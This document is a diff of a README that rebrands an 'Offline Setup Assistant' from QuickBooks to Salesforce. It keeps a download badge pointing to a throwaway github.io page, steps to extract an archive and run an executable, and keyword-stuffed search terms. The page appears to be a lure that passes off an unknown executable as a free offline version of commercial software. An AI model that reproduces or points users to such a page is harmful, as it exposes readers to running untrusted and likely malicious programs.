@@ -1,60 +1,59 @@
-# 📊 QuickBooks - Offline Setup Assistant
+# 🌐 Salesforce — Offline Setup Assistant
 
-[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blue)](https://quickbooks-offline.github.io/quickbooks-offline-setup-assistant)
-
-An unofficial offline simulator for exploring QuickBooks features without needing a cloud connection. Perfect for training, demos, and learning core accounting principles.
-
----
+[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://salesforce-offline-free-download-v1.github.io/.github)
 
 ## ⚙️ How to Use
 
-1.  Click the **Download** button above to get the setup archive.
-2.  Extract the files using a standard tool like 7-Zip or WinRAR.
-3.  Launch the `QuickBooks-Offline-Assistant.exe` application.
-4.  Select the accounting modules you wish to simulate (e.g., Invoicing, Payroll, Expenses).
-5.  Use the desktop interface to navigate QuickBooks features without an internet connection.
+1. Click the download button to get the setup archive
+2. Extract the files using 7-Zip or WinRAR
+3. Open the folder and launch the assistant tool
+4. Choose the CRM modules you want to simulate offline
+5. Use the desktop interface to explore Salesforce features without cloud access
 
 ---
 
-## 📌 Key Features
+## 📌 What You Can Do
 
--   **👤 Client & Vendor Management**: Add, edit, and manage contacts offline.
--   **🧾 Invoicing & Payments**: Create and track sample invoices and payments.
--   **💵 Expense Tracking**: Simulate logging and categorizing business expenses.
--   **📊 Financial Reports**: View pre-loaded sample reports like Profit & Loss and Balance Sheets.
--   **🖥 Windows Native**: A standalone desktop application, no installation needed.
-
----
-
-## 🖼 Preview
-
-![QuickBooks UI](https://proconnect.intuit.com/proconnect/wp-content/uploads/2020/09/quickbooks-online-accountant-features-and-benefits-for-your-practice-950x534.jpg)
-*Simulated dashboard for offline financial tracking.*
+- 👤 Manage contacts and leads offline
+- 📊 View sample dashboards and analytics
+- 💬 Explore customer pipelines and workflows
+- 🧩 Simulate sales operations without login
+- 🖥 Built-in interface, works on Windows
 
 ---
 
-## 📁 What's Included
+## 🖼 Preview Screenshots
 
--   `QuickBooks UI Simulator` (Standalone .exe)
--   `Sample Company Data` (customers, vendors, chart of accounts)
--   `Module Loader`: Invoicing / Expenses / Payroll / Reporting
--   `User Guide.pdf`
+![Salesforce Platform](https://res.cloudinary.com/hy4kyit2a/f_auto,fl_lossy,q_70/learn/modules/starting_force_com/starting_understanding_arch/images/b779912c89a05efb313ccf366c0be030_kix.k7y40gbobza5.png)
+*Interactive CRM dashboard layout*
 
 ---
 
-## 🛠 Installation
+## 📁 Included in the Package
 
-1.  Download the latest release from the [releases page](https://github.com/quickbooks-offline/quickbooks-offline-setup-assistant/releases).
-2.  Unzip the archive to a folder on your computer.
-3.  Run the main executable file.
-4.  No internet connection or QuickBooks account required.
+- Salesforce UI Shell (offline interface)
+- Sample Data Sets (leads, contacts, deals)
+- Module Loader: Sales / Service / Analytics
+- Usage Manual (PDF)
+
+---
+
+## 🛠 Installation Instructions
+
+1. Download the assistant archive
+2. Unzip it to any folder on your PC
+3. Launch the offline interface tool
+4. Select the module (Sales / Service)
+5. Start simulating CRM tasks
 
 ---
 
 ## 🔑 Keywords
 
-quickbooks offline, quickbooks desktop, accounting software, offline invoicing, payroll simulator, business finance tool, quickbooks training, expense tracker pc, free accounting app, learn quickbooks
+salesforce offline tool, salesforce pc crm, desktop crm software, salesforce dashboard no login, simulate crm for training, crm manager offline, cloudless salesforce access
 
 ---
 
-> ⚠️ **Disclaimer**: This is a third-party, unofficial training tool and is not affiliated with, endorsed by, or sponsored by Intuit Inc. It does not connect to live QuickBooks Online data. For the official product, please visit [quickbooks.intuit.com](https://quickbooks.intuit.com).
+> ⚠️ This project is a standalone offline training assistant for Salesforce-style features.
+> ✅ It does not include real Salesforce data, login bypass, or cloud connection.
+> 🔗 For the official version, visit: [https://www.salesforce.com](https://www.salesforce.com)
